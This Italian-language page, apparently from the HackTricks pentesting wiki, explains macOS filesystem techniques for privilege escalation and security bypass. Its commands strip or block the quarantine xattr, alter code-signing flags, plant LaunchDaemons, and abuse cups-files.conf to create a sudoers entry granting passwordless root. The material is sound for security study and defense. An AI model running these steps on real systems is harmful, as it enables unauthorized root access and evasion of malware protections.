# macOS FS Tricks

{{#include ../../../../banners/hacktricks-training.md}}

## Combinazioni di permessi POSIX

Permessi in una **directory**:

- **read** - puoi **enumerare** le voci della directory
- **write** - puoi **eliminare/scrivere** **file** nella directory e puoi **eliminare cartelle vuote**.
- Ma **non puoi eliminare/modificare cartelle non vuote** a meno che tu non abbia permessi di scrittura su di essa.
- **Non puoi modificare il nome di una cartella** a meno che tu non sia il proprietario.
- **execute** - ti è **consentito di attraversare** la directory - se non hai questo diritto, non puoi accedere a nessun file al suo interno, né in alcuna sottodirectory.

### Combinazioni Pericolose

**Come sovrascrivere un file/cartella di proprietà di root**, ma:

- Un **proprietario della directory** genitore nel percorso è l'utente
- Un **proprietario della directory** genitore nel percorso è un **gruppo di utenti** con **accesso in scrittura**
- Un **gruppo di utenti** ha **accesso in scrittura** al **file**

Con una delle combinazioni precedenti, un attaccante potrebbe **iniettare** un **link simbolico/duro** nel percorso previsto per ottenere una scrittura arbitraria privilegiata.

### Caso speciale della cartella root R+X

Se ci sono file in una **directory** dove **solo root ha accesso R+X**, questi **non sono accessibili a nessun altro**. Quindi una vulnerabilità che consente di **spostare un file leggibile da un utente**, che non può essere letto a causa di quella **restrizione**, da questa cartella **a un'altra**, potrebbe essere sfruttata per leggere questi file.

Esempio in: [https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/#nix-directory-permissions](https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/#nix-directory-permissions)

## Link Simbolico / Link Duro

### File/cartella permissivi

Se un processo privilegiato sta scrivendo dati in un **file** che potrebbe essere **controllato** da un **utente con privilegi inferiori**, o che potrebbe essere **stato precedentemente creato** da un utente con privilegi inferiori. L'utente potrebbe semplicemente **puntarlo a un altro file** tramite un link simbolico o duro, e il processo privilegiato scriverà su quel file.

Controlla nelle altre sezioni dove un attaccante potrebbe **sfruttare una scrittura arbitraria per elevare i privilegi**.

### Open `O_NOFOLLOW`

Il flag `O_NOFOLLOW` quando utilizzato dalla funzione `open` non seguirà un symlink nell'ultimo componente del percorso, ma seguirà il resto del percorso. Il modo corretto per prevenire il seguire symlink nel percorso è utilizzare il flag `O_NOFOLLOW_ANY`.

## .fileloc

I file con estensione **`.fileloc`** possono puntare ad altre applicazioni o binari, quindi quando vengono aperti, l'applicazione/binario sarà quello eseguito.\
Esempio:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## File Descriptors

### Leak FD (no `O_CLOEXEC`)

Se una chiamata a `open` non ha il flag `O_CLOEXEC`, il file descriptor sarà ereditato dal processo figlio. Quindi, se un processo privilegiato apre un file privilegiato ed esegue un processo controllato dall'attaccante, l'attaccante **erediterà il FD sul file privilegiato**.

Se riesci a far **aprire a un processo un file o una cartella con privilegi elevati**, puoi abusare di **`crontab`** per aprire un file in `/etc/sudoers.d` con **`EDITOR=exploit.py`**, in modo che `exploit.py` ottenga il FD al file all'interno di `/etc/sudoers` e lo abusi.

Ad esempio: [https://youtu.be/f1HA5QhLQ7Y?t=21098](https://youtu.be/f1HA5QhLQ7Y?t=21098), codice: https://github.com/gergelykalman/CVE-2023-32428-a-macOS-LPE-via-MallocStackLogging

## Avoid quarantine xattrs tricks

### Remove it
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### uchg / uchange / uimmutable flag

Se un file/cartella ha questo attributo immutabile, non sarà possibile impostare un xattr su di esso.
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### defvfs mount

Un **devfs** mount **non supporta xattr**, maggiori informazioni in [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)
```bash
mkdir /tmp/mnt
mount_devfs -o noowners none "/tmp/mnt"
chmod 777 /tmp/mnt
mkdir /tmp/mnt/lol
xattr -w com.apple.quarantine "" /tmp/mnt/lol
xattr: [Errno 1] Operation not permitted: '/tmp/mnt/lol'
```
### writeextattr ACL

Questo ACL impedisce di aggiungere `xattrs` al file
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

Il formato di file **AppleDouble** copia un file inclusi i suoi ACE.

Nel [**codice sorgente**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) è possibile vedere che la rappresentazione testuale dell'ACL memorizzata all'interno dell'xattr chiamato **`com.apple.acl.text`** verrà impostata come ACL nel file decompresso. Quindi, se hai compresso un'applicazione in un file zip con formato di file **AppleDouble** con un ACL che impedisce ad altri xattrs di essere scritti... l'xattr di quarantena non è stato impostato nell'applicazione:

Controlla il [**rapporto originale**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) per ulteriori informazioni.

Per replicare questo, dobbiamo prima ottenere la stringa acl corretta:
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
(Note that even if this works the sandbox write the quarantine xattr before)

Non è davvero necessario, ma lo lascio lì giusto in caso:

{{#ref}}
macos-xattr-acls-extra-stuff.md
{{#endref}}

## Bypass dei controlli di firma

### Bypass dei controlli dei binari di piattaforma

Al alcuni controlli di sicurezza verificano se il binario è un **binario di piattaforma**, ad esempio per consentire la connessione a un servizio XPC. Tuttavia, come esposto in un bypass in https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/, è possibile aggirare questo controllo ottenendo un binario di piattaforma (come /bin/ls) e iniettando l'exploit tramite dyld utilizzando una variabile d'ambiente `DYLD_INSERT_LIBRARIES`.

### Bypass dei flag `CS_REQUIRE_LV` e `CS_FORCED_LV`

È possibile per un binario in esecuzione modificare i propri flag per aggirare i controlli con un codice come:
```c
// Code from https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/
int pid = getpid();
NSString *exePath = NSProcessInfo.processInfo.arguments[0];

uint32_t status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
status |= 0x2000; // CS_REQUIRE_LV
csops(pid, 9, &status, 4); // CS_OPS_SET_STATUS

status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
NSLog(@"=====Inject successfully into %d(%@), csflags=0x%x", pid, exePath, status);
```
## Bypass Code Signatures

I bundle contengono il file **`_CodeSignature/CodeResources`** che contiene l'**hash** di ogni singolo **file** nel **bundle**. Nota che l'hash di CodeResources è anche **incorporato nell'eseguibile**, quindi non possiamo modificarlo.

Tuttavia, ci sono alcuni file la cui firma non verrà controllata, questi hanno la chiave omit nel plist, come:
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
È possibile calcolare la firma di una risorsa dalla cli con:
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
## Montare dmgs

Un utente può montare un dmg personalizzato creato anche sopra alcune cartelle esistenti. Questo è il modo in cui puoi creare un pacchetto dmg personalizzato con contenuti personalizzati:
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
Di solito, macOS monta i dischi comunicando con il servizio Mach `com.apple.DiskArbitrarion.diskarbitrariond` (fornito da `/usr/libexec/diskarbitrationd`). Se si aggiunge il parametro `-d` al file plist di LaunchDaemons e si riavvia, memorizzerà i log in `/var/log/diskarbitrationd.log`.\
Tuttavia, è possibile utilizzare strumenti come `hdik` e `hdiutil` per comunicare direttamente con il kext `com.apple.driver.DiskImages`.

## Scritture Arbitrari

### Script sh Periodici

Se il tuo script può essere interpretato come uno **script shell**, puoi sovrascrivere lo **`/etc/periodic/daily/999.local`** script shell che verrà attivato ogni giorno.

Puoi **fingere** un'esecuzione di questo script con: **`sudo periodic daily`**

### Daemons

Scrivi un **LaunchDaemon** arbitrario come **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** con un plist che esegue uno script arbitrario come:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
Genera semplicemente lo script `/Applications/Scripts/privesc.sh` con i **comandi** che desideri eseguire come root.

### Sudoers File

Se hai **scrittura arbitraria**, potresti creare un file all'interno della cartella **`/etc/sudoers.d/`** concedendoti privilegi **sudo**.

### PATH files

Il file **`/etc/paths`** è uno dei principali luoghi che popola la variabile d'ambiente PATH. Devi essere root per sovrascriverlo, ma se uno script di un **processo privilegiato** sta eseguendo un **comando senza il percorso completo**, potresti essere in grado di **dirottarlo** modificando questo file.

Puoi anche scrivere file in **`/etc/paths.d`** per caricare nuove cartelle nella variabile d'ambiente `PATH`.

### cups-files.conf

Questa tecnica è stata utilizzata in [questo writeup](https://www.kandji.io/blog/macos-audit-story-part1).

Crea il file `/etc/cups/cups-files.conf` con il seguente contenuto:
```
ErrorLog /etc/sudoers.d/lpe
LogFilePerm 777
<some junk>
```
Questo creerà il file `/etc/sudoers.d/lpe` con permessi 777. La spazzatura extra alla fine serve a innescare la creazione del log degli errori.

Poi, scrivi in `/etc/sudoers.d/lpe` la configurazione necessaria per elevare i privilegi come `%staff ALL=(ALL) NOPASSWD:ALL`.

Poi, modifica di nuovo il file `/etc/cups/cups-files.conf` indicando `LogFilePerm 700` in modo che il nuovo file sudoers diventi valido invocando `cupsctl`.

### Sandbox Escape

È possibile sfuggire alla sandbox di macOS con una scrittura arbitraria su FS. Per alcuni esempi, controlla la pagina [macOS Auto Start](../../../../macos-auto-start-locations.md), ma uno comune è scrivere un file di preferenze del Terminale in `~/Library/Preferences/com.apple.Terminal.plist` che esegue un comando all'avvio e chiamarlo usando `open`.

## Genera file scrivibili come altri utenti

Questo genererà un file che appartiene a root e che è scrivibile da me ([**codice da qui**](https://github.com/gergelykalman/brew-lpe-via-periodic/blob/main/brew_lpe.sh)). Questo potrebbe funzionare anche come privesc:
```bash
DIRNAME=/usr/local/etc/periodic/daily

mkdir -p "$DIRNAME"
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit," "$DIRNAME"

MallocStackLogging=1 MallocStackLoggingDirectory=$DIRNAME MallocStackLoggingDontDeleteStackLogFile=1 top invalidparametername

FILENAME=$(ls "$DIRNAME")
echo $FILENAME
```
## Memoria Condivisa POSIX

**La memoria condivisa POSIX** consente ai processi nei sistemi operativi conformi a POSIX di accedere a un'area di memoria comune, facilitando una comunicazione più rapida rispetto ad altri metodi di comunicazione inter-processo. Comporta la creazione o l'apertura di un oggetto di memoria condivisa con `shm_open()`, la definizione della sua dimensione con `ftruncate()`, e la mappatura nello spazio degli indirizzi del processo utilizzando `mmap()`. I processi possono quindi leggere e scrivere direttamente in quest'area di memoria. Per gestire l'accesso concorrente e prevenire la corruzione dei dati, vengono spesso utilizzati meccanismi di sincronizzazione come mutex o semafori. Infine, i processi smappano e chiudono la memoria condivisa con `munmap()` e `close()`, e opzionalmente rimuovono l'oggetto di memoria con `shm_unlink()`. Questo sistema è particolarmente efficace per un IPC efficiente e veloce in ambienti in cui più processi devono accedere rapidamente ai dati condivisi.

<details>

<summary>Esempio di Codice del Produttore</summary>
```c
// gcc producer.c -o producer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Create the shared memory object
int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Configure the size of the shared memory object
if (ftruncate(shm_fd, SIZE) == -1) {
perror("ftruncate");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Write to the shared memory
sprintf(ptr, "Hello from Producer!");

// Unmap and close, but do not unlink
munmap(ptr, SIZE);
close(shm_fd);

return 0;
}
```
</details>

<details>

<summary>Esempio di Codice per il Consumatore</summary>
```c
// gcc consumer.c -o consumer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Open the shared memory object
int shm_fd = shm_open(name, O_RDONLY, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Read from the shared memory
printf("Consumer received: %s\n", (char *)ptr);

// Cleanup
munmap(ptr, SIZE);
close(shm_fd);
shm_unlink(name); // Optionally unlink

return 0;
}

```
</details>

## Descrittori Protetti di macOS

I **descrittori protetti di macOS** sono una funzionalità di sicurezza introdotta in macOS per migliorare la sicurezza e l'affidabilità delle **operazioni sui descrittori di file** nelle applicazioni utente. Questi descrittori protetti forniscono un modo per associare restrizioni specifiche o "guardie" ai descrittori di file, che sono applicate dal kernel.

Questa funzionalità è particolarmente utile per prevenire determinate classi di vulnerabilità di sicurezza come **accesso non autorizzato ai file** o **condizioni di gara**. Queste vulnerabilità si verificano quando, ad esempio, un thread accede a una descrizione di file dando **accesso a un altro thread vulnerabile** o quando un descrittore di file è **ereditato** da un processo figlio vulnerabile. Alcune funzioni relative a questa funzionalità sono:

- `guarded_open_np`: Apre un FD con una guardia
- `guarded_close_np`: Chiude
- `change_fdguard_np`: Cambia i flag di guardia su un descrittore (anche rimuovendo la protezione della guardia)

## Riferimenti

- [https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/](https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/)

{{#include ../../../../banners/hacktricks-training.md}}
